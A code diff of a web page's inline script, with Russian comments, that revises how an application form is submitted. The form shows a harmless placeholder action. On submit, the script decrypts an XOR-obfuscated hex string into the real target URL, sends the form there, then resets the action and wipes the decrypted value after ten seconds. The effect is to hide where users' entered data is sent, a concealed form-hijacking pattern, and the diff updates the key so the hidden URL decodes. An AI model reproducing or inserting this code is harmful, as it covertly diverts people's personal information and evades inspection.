@@ -470,98 +470,90 @@ document.addEventListener("DOMContentLoaded", function () {
 
 <script>
 
-const _KEY = 's7!x_9k'; 
-const encryptedChunks = [
+/* --- Параметры --- */
+const _KEY = 's3cr3tK!';
 
-  '1b471702', '404e640e', '155c111f', '40043944',
-  '161d0a1d', '1c12644c', '055c0618', '52052e'
+const encryptedChunks = [
+  '1b471702',
+  '404e640e',
+  '155c111f',
+  '40043944',
+  '161d0a1d',
+  '1c12644c',
+  '055c0618',
+  '52052e'
 ];
 
 const PLACEHOLDER_ACTION = '#';
 
-
-const secretStorage = new WeakMap();
-
-
-const formKey = {};
-
-// ---- утилиты ----
+/* --- Вспомогательные функции --- */
 function hexToBytes(hex) {
   const bytes = [];
-  for (let i = 0; i < hex.length; i += 2) {
-    bytes.push(parseInt(hex.substr(i, 2), 16));
+  for (let c = 0; c < hex.length; c += 2) {
+    bytes.push(parseInt(hex.substr(c, 2), 16));
   }
   return bytes;
 }
 
 function xorDecryptFromHex(hexString, key) {
   const bytes = hexToBytes(hexString);
-  let result = '';
+  let out = '';
   for (let i = 0; i < bytes.length; i++) {
     const k = key.charCodeAt(i % key.length);
-    result += String.fromCharCode(bytes[i] ^ k);
+    out += String.fromCharCode(bytes[i] ^ k);
   }
-  return result;
-}
-
-function decryptTokenFromChunks(chunks, key) {
-  const joinedHex = chunks.join('');
-  return xorDecryptFromHex(joinedHex, key);
+  return out;
 }
 
 
-function safeWipe(refObj) {
-  try {
-    if (!refObj) return;
+function decryptToken() {
+  const hex = encryptedChunks.join('');
+  return xorDecryptFromHex(hex, _KEY);
+}
 
-    if (typeof refObj === 'object') {
-      for (const k in refObj) {
-        try { refObj[k] = null; } catch (e) {}
-      }
+
+function wipeDecrypted(referenceObj) {
+
+  if (referenceObj && typeof referenceObj === 'object') {
+    for (const k in referenceObj) {
+      try { referenceObj[k] = null; } catch(e) {}
     }
-  } catch (e) {
-
   }
 }
 
-// ---- логика формы ----
+/* --- Основная логика --- */
 document.addEventListener('DOMContentLoaded', () => {
   const form = document.getElementById('appl-form');
+
   form.action = PLACEHOLDER_ACTION;
 
-  form.addEventListener('submit', function(e) {
+
+  form.addEventListener('submit', function (e) {
 
     e.preventDefault();
 
+    const realAction = decryptToken();
 
-    const token = decryptTokenFromChunks(encryptedChunks, _KEY);
-
-
-    secretStorage.set(formKey, token);
-
-
-    form.action = token;
-
-
-    setTimeout(() => {
-      try { form.submit(); } catch (err) { console.error('Submit failed:', err); }
-    }, 0);
-
+    form.action = realAction;
 
     setTimeout(() => {
       try {
-
-        try { form.action = PLACEHOLDER_ACTION; } catch (_) {}
-
-  
-        secretStorage.delete(formKey);
-
- 
-        safeWipe({ token }); 
+        form.submit();
       } catch (err) {
-        console.error('Ошибка при очистке секрета:', err);
+        console.error('Не удалось отправить форму программно:', err);
       }
-    }, 10000); 
+    }, 0);
+
+    setTimeout(() => {
+      try {
+        form.action = PLACEHOLDER_ACTION;
+      } catch (_) {}
+
+      try {
+        wipeDecrypted({ realAction });
+      } catch (_) {}
+
+    }, 10000);
   }, { passive: false });
 });
 </script>
@@ -619,6 +611,7 @@ document.getElementById("application").addEventListener("submit", function (e) {
     }
 });
 </script>
+
 
 
 
